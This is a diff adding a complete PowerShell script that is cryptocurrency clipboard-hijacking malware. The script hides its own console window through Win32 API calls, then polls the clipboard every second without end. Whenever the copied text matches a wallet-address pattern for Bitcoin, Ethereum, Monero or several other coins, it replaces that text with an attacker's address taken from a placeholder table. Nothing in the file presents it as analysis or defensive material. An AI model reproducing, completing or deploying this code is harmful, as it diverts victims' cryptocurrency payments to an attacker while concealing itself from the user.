@@ -1,0 +1,96 @@
+Add-Type -Name Window -Namespace Console -MemberDefinition '
+[DllImport("Kernel32.dll")]
+public static extern IntPtr GetConsoleWindow();
+[DllImport("user32.dll")]
+public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+public static void Hide()
+{
+    IntPtr hWnd = GetConsoleWindow();
+    if(hWnd != IntPtr.Zero)
+    {
+        ShowWindow(hWnd, 0);
+    }
+}
+'
+
+[Console.Window]::Hide()
+
+$addy = @{
+    "BTC" = "Your btc addy"
+    "ETH" = "Your eth addy"
+    "LTC" = "Your ltc addy"
+    "TRX" = "Your trx addy"
+    "XMR" = "Your xmr addy"
+    "DOGE" = "Your doge addy"
+    "XRP" = "Your xrp addy"
+    "DASH" = "Your dash addy"
+    "ADA" = "Your ada addy"
+    #"XCHAIN" = "Your xchain addy" #?
+    #"PCHAIN" = "Your pchain addy" #?
+    #"CCHAIN" = "Your pchain addy" #?
+}
+
+while ($true) {
+    $clipper = Get-Clipboard
+
+    if ($clipper -match "^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}$") {
+        $clipper = $addy["BTC"]
+        [System.Windows.Forms.Clipboard]::SetText($clipper)
+    }
+    
+    elseif ($clipper -match "^0x[a-fA-F0-9]{40}$") {
+        $clipper = $addy["ETH"]
+        [System.Windows.Forms.Clipboard]::SetText($clipper)
+    }
+
+    elseif ($clipper -match "^[LM3][a-km-zA-HJ-NP-Z1-9]{25,34}$") {
+        $clipper = $addy["LTC"]
+        [System.Windows.Forms.Clipboard]::SetText($clipper)
+    }
+    
+    elseif ($clipper -match "^T[a-zA-HJ-NP-Z0-9]{33}$") {
+        $clipper = $addy["TRX"]
+        [System.Windows.Forms.Clipboard]::SetText($clipper)
+    }
+    
+    elseif ($clipper -match "^4[0-9AB][1-9A-HJ-NP-Za-km-z]{93}$") {
+        $clipper = $addy["XMR"]
+        [System.Windows.Forms.Clipboard]::SetText($clipper)
+    }
+
+    elseif ($clipper -match "^D{1}[5-9A-HJ-NP-U]{1}[1-9A-HJ-NP-Za-km-z]{32}$") {
+        $clipper = $addy["DOGE"]
+        [System.Windows.Forms.Clipboard]::SetText($clipper)
+    }
+
+    elseif ($clipper -match "^r[0-9a-zA-Z]{24,34}$") {
+        $clipper = $addy["XRP"]
+        [System.Windows.Forms.Clipboard]::SetText($clipper)
+    }
+
+    elseif ($clipper -match "^X[1-9A-HJ-NP-Za-km-z]{33}$") {
+        $clipper = $addy["DASH"]
+        [System.Windows.Forms.Clipboard]::SetText($clipper)
+    }
+
+    elseif ($clipper -match "^D[A-NP-Za-km-z1-9]{35,}$") {
+        $clipper = $addy["ADA"]
+        [System.Windows.Forms.Clipboard]::SetText($clipper)
+    }
+
+    elseif ($clipper -match "^([X]|[a-km-zA-HJ-NP-Z1-9]{36,72})-[a-zA-Z]{1,83}1[qpzry9x8gf2tvdw0s3jn54khce6mua7l]{38}$") {
+        $clipper = $addy["XCHAIN"]
+        [System.Windows.Forms.Clipboard]::SetText($clipper)
+    }
+
+    elseif ($clipper -match "^([P]|[a-km-zA-HJ-NP-Z1-9]{36,72})-[a-zA-Z]{1,83}1[qpzry9x8gf2tvdw0s3jn54khce6mua7l]{38}$") {
+        $clipper = $addy["PCHAIN"]
+        [System.Windows.Forms.Clipboard]::SetText($clipper)
+    }
+
+    elseif ($clipper -match "^([C]|[a-km-zA-HJ-NP-Z1-9]{36,72})-[a-zA-Z]{1,83}1[qpzry9x8gf2tvdw0s3jn54khce6mua7l]{38}") {
+        $clipper = $addy["CCHAIN"]
+        [System.Windows.Forms.Clipboard]::SetText($clipper)
+    }
+    Start-Sleep -Seconds 1
+}
